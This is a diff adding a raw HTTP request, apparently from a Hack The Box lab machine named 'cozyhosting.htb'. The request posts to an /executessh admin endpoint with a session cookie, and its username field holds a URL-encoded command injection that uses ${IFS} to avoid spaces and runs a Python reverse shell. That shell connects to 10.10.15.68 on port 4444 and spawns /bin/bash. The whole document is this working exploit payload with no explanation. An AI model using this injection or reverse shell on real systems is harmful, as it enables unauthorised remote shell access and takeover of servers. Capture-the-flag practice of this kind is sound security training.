@@ -1,0 +1,15 @@
+POST /executessh HTTP/1.1
+Host: cozyhosting.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 341
+Origin: http://cozyhosting.htb
+Connection: close
+Referer: http://cozyhosting.htb/admin
+Cookie: JSESSIONID=516E50FC0430A4384D3B2093CDCB7210
+Upgrade-Insecure-Requests: 1
+
+host=127.0.0.1&username=%3Bpython3%24%7BIFS%7D-c%24%7BIFS%7D%27a%3D__import__%3Bs%3Da%28%22socket%22%29.socket%3Bo%3Da%28%22os%22%29.dup2%3Bp%3Da%28%22pty%22%29.spawn%3Bc%3Ds%28%29%3Bc.connect%28%28%2210.10.15.68%22%2C4444%29%29%3Bf%3Dc.fileno%3Bo%28f%28%29%2C0%29%3Bo%28f%28%29%2C1%29%3Bo%28f%28%29%2C2%29%3Bp%28%22%2Fbin%2Fbash%22%29%27%3B
